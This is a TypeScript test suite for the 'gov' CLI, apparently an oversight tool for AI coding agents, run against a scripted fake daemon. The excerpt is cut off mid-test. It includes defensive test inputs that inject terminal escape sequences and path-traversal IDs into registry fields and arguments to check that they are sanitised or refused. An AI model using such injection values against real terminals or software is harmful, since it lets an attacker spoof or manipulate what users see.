// gov against a scripted govd (or none at all): what it asks, sends and prints. No real daemon,
// no AI tool; stdin is closed unless a test gives input.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { existsSync, mkdtempSync, rmSync } from "node:fs";
import { createServer } from "node:net";
import { createInterface } from "node:readline";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import type { AcpStoredRuntimeObservation } from "../../govd/src/acp-install.ts";

const gov = fileURLToPath(new URL("../src/main.ts", import.meta.url));
const root = mkdtempSync(join(tmpdir(), "gc-cli-"));
after(() => rmSync(root, { recursive: true, force: true }));
const plain = (s: string) => s.replace(/\x1b\[\d+m/g, "").replace(/\r/g, "");

type Notify = (e: unknown) => void;
const handleDisconnect = (error: NodeJS.ErrnoException) => {
  if (error.code !== "EPIPE" && error.code !== "ECONNRESET") throw error;
};

/** A govd that answers each call from `handle` (undefined: {}; a throw: an error) and records them.
 *  `drop` closes the connection, as a govd restart would. */
async function fakeGovd(handle: (method: string, params: any, notify: Notify, drop: () => void) => unknown = () => ({})) {
  const dir = mkdtempSync(join(root, "run-"));
  const calls: Array<{ method: string; params: any }> = [];
  const server = createServer((s) => {
    // A completed client may exit while the independent Gate-answer reply is in flight.
    s.on("error", handleDisconnect);
    const send = (o: unknown) => s.writable && s.write(JSON.stringify(o) + "\n");
    createInterface({ input: s }).on("error", handleDisconnect).on("line", async (l) => {
      const m = JSON.parse(l);
      calls.push({ method: m.method, params: m.params });
      try { send({ jsonrpc: "2.0", id: m.id, result: (await handle(m.method, m.params, (e) => send({ jsonrpc: "2.0", method: "event", params: e }), () => s.destroy())) ?? {} }); }
      catch (e) { send({ jsonrpc: "2.0", id: m.id, error: { code: (e as { code?: number }).code ?? 1001, message: (e as Error).message } }); }
    });
  });
  await new Promise<void>((ok) => server.listen(join(dir, "govd.sock"), ok));
  after(() => server.close());
  return { dir, calls, methods: () => calls.map((c) => c.method) };
}

/** gov with stdin closed (or fed `input`, or left open for the test to type into: `live`), against
 *  the govd whose runtime folder is `dir`. The user's git config stays out of it (gov demo commits). */
function run(dir: string, args: string[], o: { cwd?: string; input?: string; live?: boolean; pty?: boolean; stateDir?: string } = {}) {
  // Linux raw-artifact approval is exercised through a real pseudo-terminal, not mocked isTTY.
  const quote = (word: string) => "'" + word.replace(/'/g, "'\\''") + "'";
  const p = spawn(o.pty ? "script" : process.execPath, o.pty
    ? ["-qefc", [process.execPath, gov, ...args].map(quote).join(" "), "/dev/null"] : [gov, ...args], { cwd: o.cwd ?? root,
    env: { ...process.env, GOVERNCODE_RUNTIME_DIR: dir, ...(o.stateDir ? { GOVERNCODE_STATE_DIR: o.stateDir } : {}),
      GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" },
    stdio: [o.input === undefined && !o.live ? "ignore" : "pipe", "pipe", "pipe"] });
  let stdout = "", stderr = "";
  // The PTY helper may close its input pipe as soon as gov exits successfully.
  p.stdin?.on("error", handleDisconnect);
  p.stdout!.on("data", (d) => (stdout += d));
  p.stderr!.on("data", (d) => (stderr += d));
  if (o.input !== undefined) p.stdin!.end(o.input);
  return { p, out: () => plain(stdout),
    done: new Promise<{ code: number | null; stdout: string; stderr: string; rawStdout: string }>((ok) => p.on("close", (code) =>
      ok({ code, stdout: plain(stdout), stderr: plain(stderr), rawStdout: stdout }))) };
}

async function until(f: () => boolean, ms = 10_000) {
  for (let i = 0; i < ms / 20 && !f(); i++) await new Promise((r) => setTimeout(r, 20));
  assert.ok(f(), "timed out");
}

/** Types `line` once `prompt` has been on screen long enough to count as read (SETTLE_MS in main.ts). */
async function answer(r: ReturnType<typeof run>, prompt: string, line: string) {
  await until(() => r.out().endsWith(prompt));
  await new Promise((ok) => setTimeout(ok, 1100));
  r.p.stdin!.write(line + "\n");
}

test("ACP search and inspection send only read-only catalog requests", async () => {
  const catalog = { fetchedAt: "2026-01-02T03:04:05Z", sha256: "a".repeat(64), source: "https://catalog.example.org/registry.json" };
  const agent = { id: "fixture-agent", name: "Fixture Agent", version: "1.2.3", description: "Invented fixture" };
  const inspected = { catalog, agent, platform: "linux-x86_64", installation: { supported: true, plan: {
    kind: "npx", packageSpec: "fixture-agent@1.2.3", version: "1.2.3", source: "https://registry.npmjs.org/",
    checksum: null, command: ["npx", "fixture-agent@1.2.3", "acp"] } },
    eligibility: { eligible: false, reasons: ["No safety profile for this exact agent version"] } };
  const g = await fakeGovd((method) => method === "acp.search" ? { catalog, total: 2, agents: [agent] } : inspected);
  const search = await run(g.dir, ["acp", "search", "fixture", "--refresh"]).done;
  assert.equal(search.code, 0, search.stderr);
  assert.match(search.stdout, /fixture-agent · Fixture Agent 1.2.3/);
  assert.deepEqual(g.calls[0], { method: "acp.search", params: { query: "fixture", limit: 50, refresh: true } });
  const inspect = await run(g.dir, ["acp", "inspect", "fixture-agent", "--platform", "linux-x86_64", "--kind", "npx"]).done;
  assert.equal(inspect.code, 0, inspect.stderr);
  assert.match(inspect.stdout, /fixture-agent@1.2.3/);
  assert.match(inspect.stdout, /No safety profile/);
  assert.match(inspect.stdout, /Read-only inspection/);
  assert.deepEqual(g.calls[1], { method: "acp.inspect", params: { id: "fixture-agent", platform: "linux-x86_64", kind: "npx", refresh: false } });
  const machine = await run(g.dir, ["acp", "inspect", "fixture-agent", "--json"]).done;
  assert.deepEqual(JSON.parse(machine.stdout), inspected);
  assert.deepEqual(g.methods(), ["acp.search", "acp.inspect", "acp.inspect"]);
});

test("ACP rejects unsupported operations and malformed options before requesting a catalog", async () => {
  const g = await fakeGovd();
  for (const args of [[], ["probe", "fixture"], ["install"], ["install", "fixture", "--json"],
    ["install", "fixture", "--fingerprint", "bad"], ["install", "fixture", "--kind", "npm"],
    ["cancel", "G-1"], ["installed", "--refresh"], ["inspect"], ["inspect", "../fixture"],
    ["search", "one", "two"], ["search", "--kind", "npx"], ["inspect", "fixture", "--platform", "linux-arm64"],
    ["inspect", "fixture", "--kind", "npm"], ["inspect", "fixture", "--kind"], ["search", "--refresh", "--refresh"],
    ["inspect", "fixture", "--kind", "npx", "--kind", "uvx"]]) {
    const result = await run(g.dir, ["acp", ...args]).done;
    assert.equal(result.code, 1, args.join(" "));
    assert.match(result.stderr, /usage: gov acp/);
  }
  assert.deepEqual(g.calls, []);
});

const installInspection = () => ({ fingerprint: "a".repeat(64), executor: { supported: true },
  installation: { supported: true, plan: { agentId: "fixture-agent", version: "1.2.3" } } });
const installReceipt = () => ({ plan: { agentId: "fixture-agent", version: "1.2.3" }, bytes: 128,
  sha256: "b".repeat(64), installationId: "a".repeat(64) });

test("ACP install requires a fresh terminal answer and sends the inspected binding without remember scope", { skip: process.platform !== "linux" }, async () => {
  let settle!: (value: unknown) => void;
  const pending = new Promise((ok) => { settle = ok; });
  const g = await fakeGovd((method, params, notify) => {
    if (method === "acp.inspect") return installInspection();
    if (method === "acp.install") {
      notify({ kind: "acp.install", id: "I-1" });
      notify({ kind: "gate", id: "G-1", canonical: "fixture source/hash/platform/command", scopes: [] });
      return pending;
    }
    if (method === "gate.answer") { settle({ receipt: installReceipt() }); return {}; }
  });
  const r = run(g.dir, ["acp", "install", "fixture-agent"], { live: true, pty: true });
  await answer(r, "Allow G-1? [y/N] ", "yes");
  const result = await r.done;
  assert.equal(result.code, 0, result.stderr);
  assert.match(result.stdout, /cancel with gov acp cancel I-1/);
  assert.match(result.stdout, /registry-advertised/);
  assert.deepEqual(g.calls, [
    { method: "acp.inspect", params: { id: "fixture-agent", kind: "binary" } },
    { method: "watch", params: { wake: false } },
    { method: "acp.install", params: { id: "fixture-agent", kind: "binary", fingerprint: "a".repeat(64) } },
    { method: "gate.answer", params: { id: "G-1", answer: "allow" } },
  ]);
});

test("ACP install refuses a stale explicit fingerprint and unsupported executor before starting", async () => {
  const g = await fakeGovd(() => installInspection());
  const stale = await run(g.dir, ["acp", "install", "fixture-agent", "--fingerprint", "c".repeat(64)]).done;
  assert.equal(stale.code, 1); assert.match(stale.stderr, /changed since inspection/);
  assert.deepEqual(g.methods(), ["acp.inspect"]);
  const unsupported = await fakeGovd(() => ({ ...installInspection(), executor: { supported: false, reason: "archive extraction is not implemented" } }));
  const result = await run(unsupported.dir, ["acp", "install", "fixture-agent"]).done;
  assert.equal(result.code, 1); assert.match(result.stderr, /archive extraction/);
  assert.deepEqual(unsupported.methods(), ["acp.inspect"]);
});

test("ACP delayed piped approval cannot answer a Gate; an external answer withdraws the question", async () => {
  let complete!: (value: unknown) => void, notify!: Notify;
  const pending = new Promise((ok) => { complete = ok; });
  const g = await fakeGovd((method, _params, send) => {
    if (method === "acp.inspect") return installInspection();
    if (method === "acp.install") {
      notify = send;
      send({ kind: "gate", id: "G-2", canonical: "fixture binding", scopes: [] });
      return pending;
    }
  });
  const r = run(g.dir, ["acp", "install", "fixture-agent"], { live: true });
  await until(() => r.out().includes("no input here"));
  await new Promise((ok) => setTimeout(ok, 1100));
  r.p.stdin!.end("yes\n");
  await until(() => r.out().includes("ignored: no question was waiting"));
  assert.equal(g.methods().includes("gate.answer"), false);
  notify({ kind: "trace", event: { kind: "gate.allowed", data: { gate: "G-2" } } });
  complete({ receipt: installReceipt() });
  const result = await r.done;
  assert.equal(result.code, 0, result.stderr);
  assert.match(result.stdout, /answered elsewhere/);
  assert.equal(g.methods().includes("gate.answer"), false);
});

test("ACP stored inventory and cancellation use only user RPCs", async () => {
  const inventory = { installations: [installReceipt()] };
  const g = await fakeGovd((method) => method === "acp.installed" ? inventory : { id: "I-7", cancelled: true });
  const listed = await run(g.dir, ["acp", "installed", "--json"]).done;
  assert.equal(listed.code, 0); assert.deepEqual(JSON.parse(listed.stdout), inventory);
  const cancelled = await run(g.dir, ["acp", "cancel", "I-7"]).done;
  assert.equal(cancelled.code, 0); assert.match(cancelled.stdout, /I-7: cancellation requested/);
  assert.deepEqual(g.calls, [{ method: "acp.installed", params: {} }, { method: "acp.install.cancel", params: { id: "I-7" } }]);
});

const storedRuntimeObservation = (): AcpStoredRuntimeObservation => ({
  receipt: {
    schema: 1, installationId: "a".repeat(64), operation: "I-7", gate: "G-8", installedAt: "2026-01-02T04:05:06Z",
    catalog: { source: "https://catalog.example.org/registry.json", fetchedAt: "2026-01-02T03:04:05Z", sha256: "c".repeat(64) },
    plan: { agentId: "fixture-agent", name: "Fixture Agent", version: "1.2.3", kind: "binary", platform: "linux-x86_64",
      packageName: null, packageSpec: null, source: "https://artifacts.example.org/fixture-agent", integrity: "sha256",
      checksum: { algorithm: "sha256", value: "b".repeat(64) }, archiveFormat: "raw", command: ["fixture-agent", "acp"] },
    bytes: 512, sha256: "b".repeat(64), versionEvidence: "registry-advertised",
  },
  inspection: { status: "observed", evidence: "no-interpreter-or-dynamic-segments", format: "elf64-le-v1",
    platform: "linux-x86_64", machine: 62, osabi: 0, elfType: "ET_EXEC", bytes: 512,
    programHeaderOffset: 64, programHeaders: 3, loadSegments: 2 },
});
const storedRuntimeHeader = [
  `ACP stored runtime inspection · ${"a".repeat(64)}`,
  'Agent: fixture-agent "1.2.3" (registry-advertised) · linux-x86_64',
  `Artifact: SHA-256 ${"b".repeat(64)} · 512 bytes`,
  `Catalog: "https://catalog.example.org/registry.json" · fetched 2026-01-02T03:04:05Z · SHA-256 ${"c".repeat(64)}`,
  "Installed: 2026-01-02T04:05:06Z · operation I-7 · Gate G-8",
];
const storedRuntimeLimit = "Read-only finite observation; runtime compatibility and Runner eligibility are not established.";

test("ACP inspect-installed sends one passive request and prints the exact observed receipt and layout", async () => {
  const result = storedRuntimeObservation();
  const g = await fakeGovd(() => result);
  const stateDir = join(g.dir, "state");
  const r = await run(g.dir, ["acp", "inspect-installed", result.receipt.installationId], { stateDir }).done;
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.stderr, "");
  assert.equal(r.rawStdout, [...storedRuntimeHeader,
    "Observation: no PT_INTERP or PT_DYNAMIC in 3 program headers of the supported bounded private ELF snapshot.",
    "Layout: elf64-le-v1 · ET_EXEC · 2 load segments", storedRuntimeLimit, ""].join("\n"));
  assert.deepEqual(g.calls, [{ method: "acp.installed.inspect", params: { id: result.receipt.installationId } }]);
  assert.equal(existsSync(stateDir), false, "passive CLI must not create a state or artifact store");
});

test("ACP inspect-installed prints exact refusal text, preserving zero and omitting a null program header", async () => {
  for (const programHeaderIndex of [0, null]) {
    const result: AcpStoredRuntimeObservation = { ...storedRuntimeObservation(),
      inspection: { status: "refused", reason: "dynamic-segment", programHeaderIndex } };
    const g = await fakeGovd(() => result);
    const stateDir = join(g.dir, "state");
    const r = await run(g.dir, ["acp", "inspect-installed", result.receipt.installationId], { stateDir }).done;
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stderr, "");
    assert.equal(r.rawStdout, [...storedRuntimeHeader,
      `Parser refusal: dynamic-segment${programHeaderIndex === null ? "" : " · program header 0"}`,
      "The verified installation is retained; no supported-layout observation was produced.", storedRuntimeLimit, ""].join("\n"));
    assert.deepEqual(g.calls, [{ method: "acp.installed.inspect", params: { id: result.receipt.installationId } }]);
    assert.equal(existsSync(stateDir), false);
  }
});

test("ACP inspect-installed JSON is only the unchanged daemon result for observations and refusals", async () => {
  for (const inspection of [storedRuntimeObservation().inspection,
    { status: "refused", reason: "dynamic-segment", programHeaderIndex: 0 } as const,
    { status: "refused", reason: "elf-header", programHeaderIndex: null } as const]) {
    const result: AcpStoredRuntimeObservation = { ...storedRuntimeObservation(), inspection };
    const g = await fakeGovd(() => result);
    const stateDir = join(g.dir, "state");
    const r = await run(g.dir, ["acp", "inspect-installed", result.receipt.installationId, "--json"], { stateDir }).done;
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stderr, "");
    assert.equal(r.rawStdout, JSON.stringify(result, null, 2) + "\n");
    assert.deepEqual(JSON.parse(r.rawStdout), result);
    assert.deepEqual(g.calls, [{ method: "acp.installed.inspect", params: { id: result.receipt.installationId } }]);
    assert.equal(existsSync(stateDir), false);
  }
});

test("ACP inspect-installed quotes registry text without terminal control characters", async () => {
  const original = storedRuntimeObservation();
  const agentId = "fixture\u001b[31m\r\nagent", version = '1.2.3\u001b[0m\r\n"version"', source = 'https://catalog.example.org/\u001b[2J\r\n"source"';
  const result: AcpStoredRuntimeObservation = { ...original, receipt: { ...original.receipt,
    plan: { ...original.receipt.plan, agentId, version }, catalog: { ...original.receipt.catalog, source } } };
  const g = await fakeGovd(() => result);
  const stateDir = join(g.dir, "state");
  const r = await run(g.dir, ["acp", "inspect-installed", result.receipt.installationId], { stateDir }).done;
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.stderr, "");
  const header = [...storedRuntimeHeader];
  header[1] = `Agent: ${JSON.stringify(agentId)} ${JSON.stringify(version)} (registry-advertised) · linux-x86_64`;
  header[3] = `Catalog: ${JSON.stringify(source)} · fetched 2026-01-02T03:04:05Z · SHA-256 ${"c".repeat(64)}`;
  assert.equal(r.rawStdout, [...header,
    "Observation: no PT_INTERP or PT_DYNAMIC in 3 program headers of the supported bounded private ELF snapshot.",
    "Layout: elf64-le-v1 · ET_EXEC · 2 load segments", storedRuntimeLimit, ""].join("\n"));
  assert.doesNotMatch(r.rawStdout, /[\u0000-\u0009\u000b-\u001f\u007f]/u);
  assert.deepEqual(g.calls, [{ method: "acp.installed.inspect", params: { id: result.receipt.installationId } }]);
  assert.equal(existsSync(stateDir), false);
});

test("ACP inspect-installed rejects invalid grammar with usage and zero RPCs or store creation", async () => {
  const id = "a".repeat(64);
  const g = await fakeGovd();
  const stateDir = join(g.dir, "state");
  const usage = "gov: usage: gov acp search [QUERY] [--refresh] [--json] | inspect ID [--platform P] [--kind binary|npx|uvx] [--refresh] [--json] | install ID [--kind binary|npx|uvx] [--fingerprint F] | installed [--json] | inspect-installed INSTALLATION_ID [--json] | cancel I-N\n";
  for (const args of [[], ["--json"], [""], ["bad"], ["a".repeat(63)], ["a".repeat(65)], ["A".repeat(64)],
    ["g".repeat(64)], [id + "\n"], ["../" + id], [id, "extra"], [id, id], ["--json", id],
    [id, "--json", "--json"], [id, "--json", "extra"], [id, "--refresh"], [id, "--platform", "linux-x86_64"],
    [id, "--kind", "binary"], [id, "--fingerprint", id], [id, "--json=true"], [id, "-j"], [id, "--"],
    [id, "--json", "--refresh"]]) {
    const r = await run(g.dir, ["acp", "inspect-installed", ...args], { stateDir }).done;
    assert.equal(r.code, 1, JSON.stringify(args));
    assert.equal(r.rawStdout, "", JSON.stringify(args));
    assert.equal(r.stderr, usage, JSON.stringify(args));
    assert.deepEqual(g.calls, [], JSON.stringify(args));
    assert.equal(existsSync(stateDir), false, JSON.stringify(args));
  }
});

test("ACP inspect-installed unknown method on an older daemon exits once without fallback or retry", async () => {
  const id = "a".repeat(64);
  const g = await fakeGovd(() => { throw Object.assign(new Error("unknown method acp.installed.inspect"), { code: -32601 }); });
  const stateDir = join(g.dir, "state");
  const r = await run(g.dir, ["acp", "inspect-installed", id, "--json"], { stateDir }).done;
  assert.equal(r.code, 1);
  assert.equal(r.rawStdout, "");
  assert.equal(r.stderr, "gov: unknown method acp.installed.inspect\n");
  assert.deepEqual(g.calls, [{ method: "acp.installed.inspect", params: { id } }]);
  assert.equal(existsSync(stateDir), false);
});

test("ACP inspect-installed store errors exit one with no observation, retry, or fallback", async () => {
  const id = "0".repeat(64);
  const message = "stored runtime inspection did not complete; no verified observation returned";
  const g = await fakeGovd(() => { throw Object.assign(new Error(message), { code: 1001 }); });
  const stateDir = join(g.dir, "state");
  for (const args of [[id], [id, "--json"]]) {
    const before = g.calls.length;
    const r = await run(g.dir, ["acp", "inspect-installed", ...args], { stateDir }).done;
    assert.equal(r.code, 1); assert.equal(r.rawStdout, "");
    assert.equal(r.stderr, `gov: ${message}\n`);
    assert.deepEqual(g.calls.slice(before), [{ method: "acp.installed.inspect", params: { id } }]);
    assert.equal(existsSync(stateDir), false);
  }
});

test("ACP inspect-installed is advertised in the top-level help without connecting", async () => {
  const none = mkdtempSync(join(root, "none-"));
  const stateDir = join(none, "state");
  const r = await run(none, ["help"], { stateDir }).done;
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.stderr, "");
  assert.ok(r.rawStdout.includes("acp inspect-installed INSTALLATION_ID [--json]"));
  assert.equal(existsSync(stateDir), false);
});

test("gov help, --help and -h print the usage on stdout and need no govd; an unknown command gets it on stderr, without govd too", async () => {
  const none = mkdtempSync(join(root, "none-"));   // no govd listens here
  for (const h of ["help", "--help", "-h"]) {
    const r = await run(none, [h]).done;
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stderr, "");
    assert.match(r.stdout, /^usage: gov /);
    for (const part of ["open [PATH [NAME]]", "controller claude-code|codex [--model M]", "connect [agy|claude|codex|grok]", "disconnect agy|claude|codex|grok"]) {
      assert.ok(r.stdout.includes(part), part);
    }
  }
  const down = await run(none, ["status"]).done;
  assert.equal(down.code, 1);
  assert.match(down.stderr, /govd is not running .*Start it with: gov daemon start \(or run govd in another terminal\)/);
  const bad = await run(none, ["frobnicate"]).done;
  assert.equal(bad.code, 2);
  assert.equal(bad.stdout, "");
  assert.match(bad.stderr, /^usage: gov /);
});

test("arguments are checked before govd is asked anything, with a usage line or a plain rule", async () => {
  const g = await fakeGovd();
  for (const [args, said] of [
    [["new", "MyApp"], "gov: a project name uses lowercase letters, digits, . _ - and starts with a letter or digit, at most 63 characters (e.g. my-app)"],
    [["new"], "gov: usage: gov new NAME [--path P] [--no-git]"], [["new", "x", "--path"], "gov: usage: gov new NAME [--path P] [--no-git]"],
    [["open", ".", "My App"], "gov: a project name uses lowercase letters"],
    [["undo"], "gov: usage: gov undo T-N (see gov turns)"], [["undo", "12"], "gov: usage: gov undo T-N (see gov turns)"],
    [["diff"], "gov: usage: gov diff S-NNNN (see gov specs)"], [["diff", "S-1"], "gov: usage: gov diff S-NNNN (see gov specs)"],
    [["accept"], "gov: usage: gov accept S-NNNN (see gov specs)"], [["discard", "1"], "gov: usage: gov discard S-NNNN (see gov specs)"],
    [["ask"], 'gov: usage: gov ask "PROMPT"'], [["ask", " "], 'gov: usage: gov ask "PROMPT"'],
    [["reserve", "codex", "weekly", "95"], "gov: usage: gov reserve PROVIDER WINDOW PERCENT   (0-90, e.g. gov reserve codex weekly 15)"],
    [["gate", "3", "allow"], "gov: usage: gov gate G-N allow|deny"], [["plan", "1", "approve"], "gov: usage: gov plan GP-N"],
    [["proposal", "1", "create"], "gov: usage: gov proposal P-N"], [["allows", "revoke"], "gov: usage: gov allows revoke R-N (see gov allows)"],
    [["runner", "codex", "--model", "x", "--effort", "extreme"], "gov: usage: gov runner PROVIDER --model M"],
  ] as const) {
    const r = await run(g.dir, [...args]).done;
    assert.equal(r.code, 1, args.join(" "));
    assert.ok(r.stderr.startsWith(said), `${args.join(" ")}: ${r.stderr}`);
  }
  assert.deepEqual(g.methods(), [], "nothing asked of govd");
});

test("a Runner or window GovernCode does not have is refused before anything is saved; removing a budget takes any name", async () => {
  const settings = { reserves: {}, runners: {}, budgets: { antigravity: { unit: "turns", windows: { daily: 5 } } } };
  const g = await withProject((m) => (m === "settings.get" ? { settings } : m === "crew.get" ? { crew: { runners: null, maxPercent: {} } } : undefined));
  for (const [args, said] of [
    [["runner", "antigravity", "--model", "x"], "gov: unknown Runner antigravity (Runners: agy, codex, grok, ollama)"],
    [["reserve", "gemini", "weekly", "20"], "gov: unknown Runner gemini"],
    [["budget", "antigravity", "daily", "5", "turns"], "gov: unknown Runner antigravity"],
    [["budget", "codex", "5h", "5", "turns"], "gov: unknown window 5h (windows: 5-hour, daily, weekly, monthly)"],
    [["crew", "runners", "codex,antigravity"], "gov: unknown Runner antigravity"], [["crew", "max", "gemini", "10"], "gov: unknown Runner gemini"],
  ] as const) {
    const r = await run(g.dir, [...args], { cwd: g.path }).done;
    assert.equal(r.code, 1, args.join(" "));
    assert.ok(r.stderr.startsWith(said), `${args.join(" ")}: ${r.stderr}`);
  }
  assert.ok(!g.methods().some((m) => m === "settings.set" || m === "crew.set"), "nothing saved");
  // A reserve's window is govd's to check (it knows the windows each Runner reports right now).
  assert.equal((await run(g.dir, ["reserve", "codex", "primary", "20"]).done).code, 0);
  assert.deepEqual(g.calls.at(-1)!.params.reserves, { codex: { primary: 20 } });
  assert.equal((await run(g.dir, ["reserve", "grok", "period", "20"]).done).code, 0);
  assert.deepEqual(g.calls.at(-1)!.params.reserves, { grok: { period: 20 } });
  const off = await run(g.dir, ["budget", "antigravity", "off"]).done;
  assert.equal(off.code, 0, off.stderr);
  assert.deepEqual(g.calls.at(-1)!.params.budgets, {}, "a budget saved under a typo can go");
});

test("gov new says where the project is; gov specs shows the default model and leaves out an effort it does not have", async () => {
  const g = await fakeGovd((m, p) => m === "project.new" ? { project: { name: p.name, path: p.path } } : m === "project.list" ? { projects: [] }
    : m === "spec.list" ? { specs: [{ id: "S-0001", to: "codex", model: "", effort: null, status: "needs-review", files: ["a"], brief: "one" },
      { id: "S-0002", to: "agy", model: "", effort: "medium", status: "accepted", files: [], brief: "two" },
      { id: "S-0003", to: "codex", model: "gpt-5.5", effort: "high", status: "failed", files: [], brief: "three" }] } : undefined);
  const made = await run(g.dir, ["new", "my-app", "--path", "/tmp/somewhere/my-app"]).done;
  assert.equal(made.code, 0, made.stderr);
  assert.equal(made.stdout, "created my-app at /tmp/somewhere/my-app (cd there to work in it)\n");
  const specs = (await run(g.dir, ["specs"]).done).stdout.trimEnd().split("\n");
  assert.doesNotMatch(specs.join("\n"), /n\/a/);
  assert.match(specs[0], /^S-0001  codex    default model {10}needs-review /);
  assert.match(specs[1], /^S-0002  agy      default model · medium accepted /);
  assert.match(specs[2], /^S-0003  codex    gpt-5\.5 · high {9}failed /);
  assert.equal(new Set(specs.map((l) => l.search(/(needs-review|accepted|failed) /))).size, 1, "the status column lines up");
});

test("gov settings works with an older govd, and auto-resume requires recovery", async () => {
  const settings = { reserves: {}, runners: {}, specModels: "free", budgets: {}, local: { maxRunning: 1, maxMinutes: 10 },
    memory: { conversationChars: 16_000 }, specs: { maxPerProject: 3, maxPerRunner: 2 } };
  const old = await fakeGovd((m) => m === "settings.get" ? { settings } : m === "hello" ? { features: ["projects"] } : undefined);
  const shown = await run(old.dir, ["settings"]).done;
  assert.equal(shown.code, 0, shown.stderr);
  assert.doesNotMatch(shown.stdout, /auto-resume:/);
  const refused = await run(old.dir, ["auto-resume", "on"]).done;
  assert.equal(refused.code, 1);
  assert.equal(refused.stderr, "gov: this govd has no usage-limit recovery (update GovernCode)\n");
  assert.deepEqual(old.methods().slice(-1), ["hello"], "settings were not read or changed");
});

const reviewCheckpoints = { before: "a".repeat(40), after: "b".repeat(40) };
const acceptPrompt = "Apply S-0001's displayed changes? [y/N] ";
const reviewDiff = "diff --git a/note.txt b/note.txt\n+reviewed change\n";

test("gov accept shows the exact diff and requires a fresh confirmation, including with piped input", async () => {
  const g = await fakeGovd((m) => m === "spec.diff" ? { diff: reviewDiff, checkpoints: reviewCheckpoints }
    : { id: "S-0001", applied: ["note.txt"] });
  for (const input of [undefined, "y\n"]) {
    const start = g.calls.length;
    const r = await run(g.dir, ["accept", "S-0001"], { input }).done;
    assert.equal(r.code, 1, r.stderr);
    assert.ok(r.stdout.includes(reviewDiff));
    assert.ok(r.stdout.includes(`${reviewCheckpoints.before} → ${reviewCheckpoints.after}`));
    assert.match(r.stderr, /not accepted/);
    assert.deepEqual(g.calls.slice(start).map((c) => c.method), ["spec.diff"]);
  }
  const r = run(g.dir, ["accept", "S-0001"], { live: true });
  try {
    await answer(r, acceptPrompt, "yes");
    const result = await r.done;
    assert.equal(result.code, 0, result.stderr);
    assert.deepEqual(g.calls.at(-1), { method: "spec.accept", params: { id: "S-0001", checkpoints: reviewCheckpoints } });
  } finally { r.p.kill(); }
});

test("gov accept declines without applying, and never rebinds a confirmation to a newer round", async () => {
  let changed = false;
  const g = await fakeGovd((m, p) => {
    if (m === "spec.diff") return { diff: reviewDiff, checkpoints: reviewCheckpoints };
    if (m === "spec.accept") {
      assert.deepEqual(p.checkpoints, reviewCheckpoints);
      if (changed) throw new Error("snapshots changed; reload the diff");
      return { id: p.id, applied: [] };
    }
  });
  const no = run(g.dir, ["accept", "S-0001"], { live: true });
  try {
    await answer(no, acceptPrompt, "n");
    assert.equal((await no.done).code, 0);
    assert.deepEqual(g.methods(), ["spec.diff"]);
  } finally { no.p.kill(); }
  const yes = run(g.dir, ["accept", "S-0001"], { live: true });
  try {
    await until(() => yes.out().endsWith(acceptPrompt));
    changed = true;
    await answer(yes, acceptPrompt, "y");
    const r = await yes.done;
    assert.equal(r.code, 1);
    assert.match(r.stderr, /snapshots changed/);
    assert.deepEqual(g.methods(), ["spec.diff", "spec.diff", "spec.accept"]);
  } finally { yes.p.kill(); }
});

test("gov accept's explicit snapshots must be complete, valid, and match the returned diff", async () => {
  const g = await fakeGovd((m) => m === "spec.diff" ? { diff: reviewDiff, checkpoints: reviewCheckpoints }
    : { id: "S-0001", applied: [] });
  for (const flags of [["--before", reviewCheckpoints.before], ["--after", reviewCheckpoints.after],
    ["--before", "abcd", "--after", reviewCheckpoints.after],
    ["--before", reviewCheckpoints.before, "--after", "g".repeat(40)], ["--yes"],
    ["--before", reviewCheckpoints.before, "--after", reviewCheckpoints.after, "--yes"]]) {
    const start = g.calls.length;
    const r = await run(g.dir, ["accept", "S-0001", ...flags]).done;
    assert.equal(r.code, 1);
    assert.deepEqual(g.calls.slice(start), [], "invalid flags never reach govd");
  }
  const stale = await run(g.dir, ["accept", "S-0001", "--before", reviewCheckpoints.before, "--after", "c".repeat(40)]).done;
  assert.equal(stale.code, 1);
  assert.match(stale.stderr, /snapshots.*match/);
  assert.deepEqual(g.methods(), ["spec.diff"]);
  const r = await run(g.dir, ["accept", "S-0001", "--after", reviewCheckpoints.after, "--before", reviewCheckpoints.before]).done;
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(g.calls.at(-1), { method: "spec.accept", params: { id: "S-0001", checkpoints: reviewCheckpoints } });
});

test("gov accept refuses a diff without valid checkpoints instead of sending an ID-only request", async () => {
  for (const checkpoints of [undefined, { before: null, after: reviewCheckpoints.after },
    { before: reviewCheckpoints.before, after: "" }, { before: "bad", after: reviewCheckpoints.after }]) {
    const g = await fakeGovd(() => ({ diff: reviewDiff, checkpoints }));
    const r = await run(g.dir, ["accept", "S-0001"]).done;
    assert.equal(r.code, 1);
    assert.match(r.stderr, /review checkpoints/);
    assert.deepEqual(g.methods(), ["spec.diff"]);
  }
});

test("gov limited, resume and auto-resume use the recovery methods", async () => {
  const since = "2026-10-03T00:00:00.000Z";
  const settings = { personal: { claude: false, codex: false }, recovery: { autoResume: false } };
  const items = [{ target: "S-0001", project: "p", kind: "held", provider: "codex", resetsAt: null,
    since, why: "held", atReset: false, due: false }, { target: "T-7", project: "other", kind: "turn",
    provider: "claude-code", resetsAt: null, since: "2026-10-03T01:00:00.000Z", why: "limited", atReset: false, due: false }];
  const g = await fakeGovd((m, p) => m === "recovery.list" ? { items }
    : m === "recovery.resume" ? { id: p.id, status: "running" }
    : m === "hello" ? { features: ["projects", "recovery"] }
    : m === "settings.get" ? { settings }
    : m === "project.list" ? { projects: [{ name: "other", path: "/other", controller: { provider: "claude-code" } }] }
    : m === "tools.list" ? { tools: [] }
    : m === "ask" ? { ok: true, summary: "done" } : undefined);
  const limited = await run(g.dir, ["limited"]).done;
  assert.equal(limited.code, 0, limited.stderr);
  assert.match(limited.stdout, /S-0001 +held Spec +codex +reset time unknown · at reset: off/);
  const command = async (args: string[]) => {
    const before = g.calls.length;
    const result = await run(g.dir, args).done;
    return { result, calls: g.calls.slice(before) };
  };
  const now = await command(["resume", "S-0001"]);
  assert.match(now.result.stdout, /S-0001: running/);
